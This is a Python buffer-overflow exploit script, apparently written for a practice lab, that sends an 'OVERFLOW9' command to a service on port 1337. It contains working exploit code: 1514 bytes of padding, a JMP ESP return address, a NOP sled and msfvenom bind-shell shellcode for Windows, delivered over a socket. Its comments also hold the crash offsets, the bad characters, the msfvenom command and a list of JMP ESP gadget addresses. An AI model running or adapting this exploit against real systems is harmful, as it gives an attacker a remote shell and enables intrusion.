import socket
import time


# Fuzzing shows crash at 1600 bytes input

host = "10.10.237.37"
port = 1337

offset = 1514
junk_data = bytearray(b"A" * offset)
return_address = bytearray(b"\xaf\x11\x50\x62")

nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)

shell_code = (
    b"\xb8\x1b\xa7\xce\xc9\xdb\xc1\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
    b"\x53\x31\x43\x12\x03\x43\x12\x83\xf0\x5b\x2c\x3c\xfa\x4c\x33"
    b"\xbf\x02\x8d\x54\x49\xe7\xbc\x54\x2d\x6c\xee\x64\x25\x20\x03"
    b"\x0e\x6b\xd0\x90\x62\xa4\xd7\x11\xc8\x92\xd6\xa2\x61\xe6\x79"
    b"\x21\x78\x3b\x59\x18\xb3\x4e\x98\x5d\xae\xa3\xc8\x36\xa4\x16"
    b"\xfc\x33\xf0\xaa\x77\x0f\x14\xab\x64\xd8\x17\x9a\x3b\x52\x4e"
    b"\x3c\xba\xb7\xfa\x75\xa4\xd4\xc7\xcc\x5f\x2e\xb3\xce\x89\x7e"
    b"\x3c\x7c\xf4\x4e\xcf\x7c\x31\x68\x30\x0b\x4b\x8a\xcd\x0c\x88"
    b"\xf0\x09\x98\x0a\x52\xd9\x3a\xf6\x62\x0e\xdc\x7d\x68\xfb\xaa"
    b"\xd9\x6d\xfa\x7f\x52\x89\x77\x7e\xb4\x1b\xc3\xa5\x10\x47\x97"
    b"\xc4\x01\x2d\x76\xf8\x51\x8e\x27\x5c\x1a\x23\x33\xed\x41\x2c"
    b"\xf0\xdc\x79\xac\x9e\x57\x0a\x9e\x01\xcc\x84\x92\xca\xca\x53"
    b"\xd4\xe0\xab\xcb\x2b\x0b\xcc\xc2\xef\x5f\x9c\x7c\xd9\xdf\x77"
    b"\x7c\xe6\x35\xed\x74\x41\xe6\x10\x79\x31\x56\x95\xd1\xda\xbc"
    b"\x1a\x0e\xfa\xbe\xf0\x27\x93\x42\xfb\x56\x38\xca\x1d\x32\xd0"
    b"\x9a\xb6\xaa\x12\xf9\x0e\x4d\x6c\x2b\x27\xf9\x25\x3d\xf0\x06"
    b"\xb6\x6b\x56\x90\x3d\x78\x62\x81\x41\x55\xc2\xd6\xd6\x23\x83"
    b"\x95\x47\x33\x8e\x4d\xeb\xa6\x55\x8d\x62\xdb\xc1\xda\x23\x2d"
    b"\x18\x8e\xd9\x14\xb2\xac\x23\xc0\xfd\x74\xf8\x31\x03\x75\x8d"
    b"\x0e\x27\x65\x4b\x8e\x63\xd1\x03\xd9\x3d\x8f\xe5\xb3\x8f\x79"
    b"\xbc\x68\x46\xed\x39\x43\x59\x6b\x46\x8e\x2f\x93\xf7\x67\x76"
    b"\xac\x38\xe0\x7e\xd5\x24\x90\x81\x0c\xed\xa0\xcb\x0c\x44\x29"
    b"\x92\xc5\xd4\x34\x25\x30\x1a\x41\xa6\xb0\xe3\xb6\xb6\xb1\xe6"
    b"\xf3\x70\x2a\x9b\x6c\x15\x4c\x08\x8c\x3c"
)

buffer = junk_data + return_address + nop_sled + shell_code

def sendExploit(host, port, buffer):
    prefix = bytearray("OVERFLOW9 ".encode("ascii"))
    suffix = bytearray("".encode("ascii"))

    exploitInput = prefix + buffer + suffix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print("[+] Client connected.")

        print(f"[!] Data received from server: {csocket.recv(1024).decode('ascii')}")

        print("[+] Attempting to send exploit input...")
        csocket.send(exploitInput)


# Send data
sendExploit(host, port, buffer)


        
# Comments:

# EIP at crash: 35794234
# ESP at crash: 018DFA30 -> 42367942

# EIP Pattern Offset: 1514
# ESP (0x018dfa30) points at offset 1518

# ESP points inside of the pattern
# We can use `JMP ESP` instruction
# to jump to our exploit input

# Bad chars: 0x00, 0x04, 0x3e, 0x3f, 0xe1

# msfvenom -p windows/shell_bind_tcp -f c -a x86 --platform windows -b '\x00\x04\x3e\x3f\xe1'

# `JMP ESP` Addresses without Bad chars
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
